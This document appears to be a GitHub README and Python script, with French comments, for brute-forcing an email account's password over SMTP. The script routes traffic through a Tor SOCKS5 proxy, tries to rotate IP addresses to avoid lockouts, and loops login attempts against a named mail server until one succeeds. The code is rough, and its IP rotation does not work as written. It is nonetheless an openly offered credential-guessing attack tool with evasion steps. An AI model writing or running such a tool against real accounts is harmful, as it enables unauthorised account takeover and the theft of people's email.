# brute_force_mail
its an a brute force of e mail
import smtplib
from itertools import product
from itertools import cycle
import requests
import socket
import socks

# Configuration du proxy SOCKS
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)  # Assure-toi d'avoir un proxy SOCKS5 configuré correctement
socket.socket = socks.socksocket

# Email cible
email_cible = 'exemple.com'

# Liste de mots de passe à tester
mots_de_passe = ['motdepasse1', 'motdepasse2', 'motdepasse3']  # Ajoute autant de mots de passe que tu veux

# Configuration du serveur SMTP
serveur_smtp = smtplib.SMTP('smtp.inficredits.fr', 587)
serveur_smtp.starttls()

# Générateur de cycles d'adresses IP
def changer_ip():
    ips = cycle(['1.2.3.4', '5.6.7.8', '9.10.11.12'])  # Ajoute tes propres adresses IP
    for ip in ips:
        yield ip

# Boucle de brute force
for mot_de_passe in mots_de_passe:
    try:
        # Changement d'IP
        adresse_ip = changer_ip()
        requests.get('http://icanhazip.com/', proxies={'http': 'socks5://' + next(adresse_ip), 'https': 'socks5://' + next(adresse_ip)})
        
        # Tentative de connexion SMTP
        serveur_smtp.login(email_cible, mot_de_passe)
        print(f'Succès ! Mot de passe trouvé : {mot_de_passe}')
        break
    except smtplib.SMTPAuthenticationError:
        print(f'Tentative échouée avec le mot de passe : {mot_de_passe}')
